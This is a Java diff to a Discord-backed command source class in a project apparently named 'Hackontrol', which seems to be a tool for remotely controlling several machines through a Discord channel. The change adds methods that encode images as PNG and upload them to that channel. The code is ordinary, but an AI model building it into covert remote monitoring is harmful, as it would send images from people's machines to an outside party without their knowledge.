@@ -1,9 +1,16 @@
 package com.khopan.hackontrol.source;
 
+import java.awt.Graphics2D;
+import java.awt.Image;
+import java.awt.image.BufferedImage;
+import java.io.ByteArrayOutputStream;
 import java.util.function.Consumer;
 import java.util.function.Supplier;
 
+import javax.imageio.ImageIO;
+
 import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
+import net.dv8tion.jda.api.utils.FileUpload;
 
 public class DefaultCommandSource implements CommandSource {
 	private final String machineIdentifier;
@@ -24,6 +31,21 @@ public class DefaultCommandSource implements CommandSource {
 	}
 
 	@Override
+	public boolean isSelected() {
+		return this.selected.get();
+	}
+
+	@Override
+	public void setSelected(boolean selected) {
+		if(this.selected.get() == selected) {
+			return;
+		}
+
+		this.setSelected.accept(selected);
+		this.sendMessage('`' + this.machineIdentifier + "` was " + (selected ? "" : "un") + "selected!");
+	}
+
+	@Override
 	public void sendMessage(String message) {
 		this.channel.sendMessage(message).queue();
 	}
@@ -39,17 +61,50 @@ public class DefaultCommandSource implements CommandSource {
 	}
 
 	@Override
-	public boolean isSelected() {
-		return this.selected.get();
-	}
+	public void sendImage(Image image) {
+		FileUpload upload = this.toFileUpload(image);
 
-	@Override
-	public void setSelected(boolean selected) {
-		if(this.selected.get() == selected) {
+		if(upload == null) {
 			return;
 		}
 
-		this.setSelected.accept(selected);
-		this.sendMessage('`' + this.machineIdentifier + "` was " + (selected ? "" : "un") + "selected!");
+		this.channel.sendFiles(upload).queue();
+	}
+
+	@Override
+	public void sendImage(Image image, String message) {
+		FileUpload upload = this.toFileUpload(image);
+
+		if(upload == null) {
+			return;
+		}
+
+		this.channel.sendMessage(message).addFiles(upload).queue();
+	}
+
+	private FileUpload toFileUpload(Image image) {
+		BufferedImage bufferedImage;
+
+		if(image instanceof BufferedImage buffered) {
+			bufferedImage = buffered;
+		} else {
+			int width = image.getWidth(null);
+			int height = image.getHeight(null);
+			bufferedImage = new BufferedImage(width, height, BufferedImage.TYPE_INT_ARGB);
+			Graphics2D Graphics = bufferedImage.createGraphics();
+			Graphics.drawImage(image, 0, 0, null);
+			Graphics.dispose();
+		}
+
+		ByteArrayOutputStream stream = new ByteArrayOutputStream();
+
+		try {
+			ImageIO.write(bufferedImage, "png", stream);
+		} catch(Throwable ignored) {
+			this.sendMessage("Failed to send an image `" + this.getMachineId() + '`');
+			return null;
+		}
+
+		return FileUpload.fromData(stream.toByteArray(), "image.png");
 	}
 }
